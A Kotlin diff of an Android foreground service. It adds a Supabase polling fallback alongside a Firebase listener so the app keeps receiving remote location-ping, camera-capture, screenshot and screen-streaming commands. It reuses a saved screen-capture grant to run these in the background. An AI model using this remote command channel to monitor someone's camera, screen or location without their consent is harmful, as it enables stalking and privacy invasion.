@@ -208,6 +208,10 @@ class ForegroundService : Service() {
         }
     }
 
+    private val handledRequestIds = java.util.Collections.synchronizedSet(HashSet<String>())
+    private var supabasePollHandler: Handler? = null
+    private var supabasePollRunnable: Runnable? = null
+
     private fun setupFirestoreRequestListener() {
         if (firestoreListener != null) return
 
@@ -226,6 +230,10 @@ class ForegroundService : Service() {
             return
         }
 
+        // 1. Start Supabase REST Failover Poller (Runs in background even if Firebase Quota is exhausted)
+        startSupabasePoller(deviceId)
+
+        // 2. Start Firebase Firestore Listener
         try {
             val firestore = FirebaseFirestore.getInstance()
             firestoreListener = firestore.collection("screenshot_requests")
@@ -253,92 +261,140 @@ class ForegroundService : Service() {
                                 continue
                             }
 
-                            when (requestType) {
-                                "location_ping" -> {
-                                    fetchLocationOnce(requestId)
-                                }
-                                "camera_capture" -> {
-                                    markBackgroundAttempt(requestId)
-                                    try {
-                                        val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
-                                            putExtra("requestId", requestId)
-                                            putExtra("cameraFacing", cameraFacing)
-                                        }
-                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                                            startForegroundService(svcIntent)
-                                        } else {
-                                            startService(svcIntent)
-                                        }
-                                    } catch (e: Throwable) {
-                                        Log.e("ForegroundService", "CameraCaptureService start error: ${e.message}")
-                                        CloudBridgeSync.updateRequestStatus(
-                                            requestId = requestId,
-                                            status = "failed",
-                                            error = "Service start disallowed",
-                                            failureReason = "OS disallowed background camera start: ${e.message}"
-                                        )
-                                    }
-                                }
-                                "screen_share", "camera_stream" -> {
-                                    markBackgroundAttempt(requestId)
-                                    try {
-                                        val svcIntent = Intent(this, WebRtcPublisherService::class.java).apply {
-                                            putExtra("requestId", requestId)
-                                            putExtra("cameraFacing", cameraFacing)
-                                            putExtra("requestType", requestType)
-                                            val savedProjection = MediaProjectionStore.load(this@ForegroundService)
-                                            if (savedProjection.first != 0 && savedProjection.second != null) {
-                                                putExtra("resultCode", savedProjection.first)
-                                                putExtra("resultData", savedProjection.second)
-                                            }
-                                        }
-                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                                            startForegroundService(svcIntent)
-                                        } else {
-                                            startService(svcIntent)
-                                        }
-                                    } catch (e: Throwable) {
-                                        Log.e("ForegroundService", "WebRtcPublisherService start error: ${e.message}")
-                                        CloudBridgeSync.updateRequestStatus(
-                                            requestId = requestId,
-                                            status = "failed",
-                                            error = "Stream start disallowed",
-                                            failureReason = "OS disallowed background stream start: ${e.message}"
-                                        )
-                                    }
-                                }
-                                "screenshot" -> {
-                                    try {
-                                        val savedProjection = MediaProjectionStore.load(this@ForegroundService)
-                                        val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
-                                            putExtra("requestId", requestId)
-                                            putExtra("capture_once", true)
-                                            if (savedProjection.first != 0 && savedProjection.second != null) {
-                                                putExtra("resultCode", savedProjection.first)
-                                                putExtra("resultData", savedProjection.second)
-                                            }
-                                        }
-                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                                            startForegroundService(svcIntent)
-                                        } else {
-                                            startService(svcIntent)
-                                        }
-                                    } catch (e: Throwable) {
-                                        Log.e("ForegroundService", "ScreenCaptureService start error: ${e.message}")
-                                        CloudBridgeSync.updateRequestStatus(
-                                            requestId = requestId,
-                                            status = "failed",
-                                            error = "Screen capture start disallowed",
-                                            failureReason = "OS disallowed background capture start: ${e.message}"
-                                        )
-                                    }
-                                }
-                            }
+                            handleIncomingCommand(requestId, requestType, cameraFacing)
                         }
                     }
                 }
         } catch (e: Exception) {
             e.printStackTrace()
+        }
+    }
+
+    private fun startSupabasePoller(deviceId: String) {
+        supabasePollHandler?.removeCallbacksAndMessages(null)
+        supabasePollHandler = Handler(Looper.getMainLooper())
+        supabasePollRunnable = object : Runnable {
+            override fun run() {
+                Thread {
+                    try {
+                        val getUrl = java.net.URL("${CloudBridgeSync.SUPABASE_URL}/rest/v1/screenshot_requests?target_device_id=eq.$deviceId&status=eq.pending&select=*")
+                        val conn = getUrl.openConnection() as java.net.HttpURLConnection
+                        conn.requestMethod = "GET"
+                        conn.setRequestProperty("apikey", CloudBridgeSync.SUPABASE_ANON_KEY)
+                        conn.setRequestProperty("Authorization", "Bearer ${CloudBridgeSync.SUPABASE_ANON_KEY}")
+                        conn.connectTimeout = 4000
+                        conn.readTimeout = 4000
+
+                        if (conn.responseCode == 200) {
+                            val responseText = conn.inputStream.bufferedReader().use { it.readText() }
+                            val jsonArray = org.json.JSONArray(responseText)
+                            for (i in 0 until jsonArray.length()) {
+                                val item = jsonArray.getJSONObject(i)
+                                val requestId = item.optString("id")
+                                val requestType = item.optString("request_type", "screenshot")
+                                val cameraFacing = item.optString("camera_facing", "front")
+                                if (requestId.isNotEmpty()) {
+                                    handleIncomingCommand(requestId, requestType, cameraFacing)
+                                }
+                            }
+                        }
+                    } catch (_: Throwable) {}
+                }.start()
+                supabasePollHandler?.postDelayed(this, 3500)
+            }
+        }
+        supabasePollHandler?.post(supabasePollRunnable!!)
+    }
+
+    private fun handleIncomingCommand(requestId: String, requestType: String, cameraFacing: String) {
+        if (handledRequestIds.contains(requestId)) return
+        handledRequestIds.add(requestId)
+
+        // Schedule removal after 15 seconds to prevent unbounded growth
+        Handler(Looper.getMainLooper()).postDelayed({
+            handledRequestIds.remove(requestId)
+        }, 15000)
+
+        when (requestType) {
+            "location_ping" -> {
+                fetchLocationOnce(requestId)
+            }
+            "camera_capture" -> {
+                markBackgroundAttempt(requestId)
+                try {
+                    val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
+                        putExtra("requestId", requestId)
+                        putExtra("cameraFacing", cameraFacing)
+                    }
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        startForegroundService(svcIntent)
+                    } else {
+                        startService(svcIntent)
+                    }
+                } catch (e: Throwable) {
+                    Log.e("ForegroundService", "CameraCaptureService start error: ${e.message}")
+                    CloudBridgeSync.updateRequestStatus(
+                        requestId = requestId,
+                        status = "failed",
+                        error = "Service start disallowed",
+                        failureReason = "OS disallowed background camera start: ${e.message}"
+                    )
+                }
+            }
+            "screen_share", "camera_stream" -> {
+                markBackgroundAttempt(requestId)
+                try {
+                    val svcIntent = Intent(this, WebRtcPublisherService::class.java).apply {
+                        putExtra("requestId", requestId)
+                        putExtra("cameraFacing", cameraFacing)
+                        putExtra("requestType", requestType)
+                        val savedProjection = MediaProjectionStore.load(this@ForegroundService)
+                        if (savedProjection.first != 0 && savedProjection.second != null) {
+                            putExtra("resultCode", savedProjection.first)
+                            putExtra("resultData", savedProjection.second)
+                        }
+                    }
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        startForegroundService(svcIntent)
+                    } else {
+                        startService(svcIntent)
+                    }
+                } catch (e: Throwable) {
+                    Log.e("ForegroundService", "WebRtcPublisherService start error: ${e.message}")
+                    CloudBridgeSync.updateRequestStatus(
+                        requestId = requestId,
+                        status = "failed",
+                        error = "Stream start disallowed",
+                        failureReason = "OS disallowed background stream start: ${e.message}"
+                    )
+                }
+            }
+            "screenshot" -> {
+                try {
+                    val savedProjection = MediaProjectionStore.load(this@ForegroundService)
+                    val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
+                        putExtra("requestId", requestId)
+                        putExtra("capture_once", true)
+                        if (savedProjection.first != 0 && savedProjection.second != null) {
+                            putExtra("resultCode", savedProjection.first)
+                            putExtra("resultData", savedProjection.second)
+                        }
+                    }
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        startForegroundService(svcIntent)
+                    } else {
+                        startService(svcIntent)
+                    }
+                } catch (e: Throwable) {
+                    Log.e("ForegroundService", "ScreenCaptureService start error: ${e.message}")
+                    CloudBridgeSync.updateRequestStatus(
+                        requestId = requestId,
+                        status = "failed",
+                        error = "Screen capture start disallowed",
+                        failureReason = "OS disallowed background capture start: ${e.message}"
+                    )
+                }
+            }
         }
     }
 
